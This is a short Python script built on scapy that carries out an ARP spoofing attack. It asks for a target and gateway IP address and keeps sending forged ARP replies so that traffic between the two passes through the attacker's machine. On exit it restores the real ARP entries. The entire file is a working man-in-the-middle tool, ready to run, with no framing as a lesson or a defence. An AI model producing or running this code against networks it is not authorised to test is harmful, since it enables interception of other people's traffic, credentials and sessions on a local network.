import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    request = broadcast / arp_request

    answered = scapy.srp(request, timeout=1, verbose=False)[0]

    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    packet = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )

    scapy.send(packet, verbose=False)

def restore(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    packet = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=gateway_mac
    )

    scapy.send(packet, count=4, verbose=False)

target_ip = input("Target IP: ")
gateway_ip = input("Gateway IP: ")

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        print("Packets sent...")
        time.sleep(2)

except KeyboardInterrupt:
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("Network restored")